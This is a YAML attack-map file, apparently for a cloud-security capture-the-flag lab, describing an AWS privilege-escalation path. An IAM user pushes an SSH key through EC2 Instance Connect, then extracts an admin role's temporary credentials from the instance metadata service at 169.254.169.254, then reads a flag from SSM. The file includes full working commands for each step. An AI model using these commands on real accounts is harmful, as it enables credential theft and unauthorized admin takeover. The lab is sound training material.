attackMap:
  nodes:
    - id: starting-principal
      label: "Starting User"
      type: principal
      subType: iam-user
      arn: "arn:aws:iam::{account_id}:user/pl-prod-ec2-003-to-admin-starting-user"
      access:
        type: assumed-breach-credentials
      description: >
        You have gained access to this principal's AWS IAM credentials. These could
        have been obtained through many real-world vectors: phishing a developer and
        gaining access to their workstation, compromising a browser session, exploiting
        a vulnerable workload running in this AWS account, discovering credentials in
        a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.

        Regardless of how you obtained them, you are now operating as this principal.
        This IAM user has the ec2-instance-connect:SendSSHPublicKey permission, allowing
        it to push SSH public keys to the target EC2 instance that has an administrative
        IAM role attached via its instance profile.

    - id: ec2-instance
      label: "EC2 Instance"
      type: resource
      subType: ec2-instance
      arn: "arn:aws:ec2:{region}:{account_id}:instance/i-xxxxxxxxx"
      description: >
        This EC2 instance has an administrative IAM role attached via its instance profile.
        By pushing an SSH public key using EC2 Instance Connect and connecting within the
        60-second validity window, you can access the instance shell and query IMDSv2 to
        retrieve the temporary credentials of the attached admin role.

    - id: target-role
      label: "Admin Role"
      type: principal
      subType: iam-role
      isAdmin: true
      arn: "arn:aws:iam::{account_id}:role/pl-prod-ec2-003-to-admin-ec2-admin-role"
      description: >
        This IAM role has AdministratorAccess and is attached to the EC2 instance via
        its instance profile. By extracting its temporary credentials from IMDSv2, you
        gain full administrative access to the AWS account. Admin-equivalent permissions
        are then used to read the scenario's CTF flag from SSM Parameter Store.

    - id: ctf-flag
      label: "CTF Flag"
      type: resource
      subType: ssm-parameter
      isTarget: true
      arn: "arn:aws:ssm:{region}:{account_id}:parameter/pathfinding-labs/flags/ec2-003-to-admin"
      description: >
        The CTF flag for this scenario, stored as an SSM parameter in the victim account.
        Retrieving it requires administrator-equivalent permissions (ssm:GetParameter is
        granted implicitly by AdministratorAccess). Your goal is to read this parameter
        using the admin access gained from the previous step.

  edges:
    - from: starting-principal
      to: ec2-instance
      label: "ec2-instance-connect:SendSSHPublicKey"
      description: >
        Push a temporary SSH public key to the EC2 instance using EC2 Instance Connect.
        The key is valid for 60 seconds, providing a window to establish an SSH connection.
      hints:
        - "Generate a local SSH key pair with ssh-keygen, then push the public key to the instance using ec2-instance-connect:SendSSHPublicKey. The key is only valid for 60 seconds — have your SSH command ready before pushing. You will need the instance's public IP and the OS username (ec2-user for Amazon Linux)."
        - "Once on the instance, retrieve task role credentials from IMDSv2: first obtain a session token via PUT to http://169.254.169.254/latest/api/token with the TTL header, then query /latest/meta-data/iam/security-credentials/<role-name>. Export all three credential fields (AccessKeyId, SecretAccessKey, Token) on your local machine."
        - "Browse to https://pathfinding.cloud/paths/ec2-003 for technique details."
      commands:
        - description: "List EC2 instances with their instance profiles"
          command: "aws ec2 describe-instances --query 'Reservations[*].Instances[*].[InstanceId,State.Name,PublicIpAddress,IamInstanceProfile.Arn]' --output table"
        - description: "Generate a temporary SSH key pair"
          command: "ssh-keygen -t rsa -f /tmp/ec2-connect-key -N '' -q"
        - description: "Push the public key to the EC2 instance"
          command: "aws ec2-instance-connect send-ssh-public-key --region <region> --instance-id <instance-id> --instance-os-user ec2-user --ssh-public-key file:///tmp/ec2-connect-key.pub"
        - description: "SSH into the instance within the 60-second window"
          command: "ssh -i /tmp/ec2-connect-key -o StrictHostKeyChecking=no ec2-user@<instance-public-ip>"

    - from: ec2-instance
      to: target-role
      label: "IMDSv2 credential extraction"
      description: >
        Once on the instance, query the Instance Metadata Service (IMDSv2) to retrieve
        the temporary security credentials for the attached administrative IAM role.
      hints: []
      commands:
        - description: "Get an IMDSv2 session token"
          command: "TOKEN=$(curl -s -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600')"
        - description: "Retrieve the instance profile role name"
          command: "ROLE_NAME=$(curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/)"
        - description: "Extract the temporary credentials for the attached role"
          command: "curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME"
        - description: "Verify administrator access with the extracted credentials"
          command: "aws iam list-users --max-items 1"

    - from: target-role
      to: ctf-flag
      label: "Read CTF flag"
      description: >
        With administrator-equivalent permissions now attached to the starting user,
        retrieve the scenario flag from SSM Parameter Store. AdministratorAccess grants
        ssm:GetParameter on all parameters in the account, so no additional permissions
        are needed beyond the admin access you just gained.
      hints:
        - "Use ssm:GetParameter with the full parameter name to retrieve the flag value."
      commands:
        - description: "Retrieve the CTF flag from SSM Parameter Store"
          command: "aws ssm get-parameter --name /pathfinding-labs/flags/ec2-003-to-admin --query 'Parameter.Value' --output text"
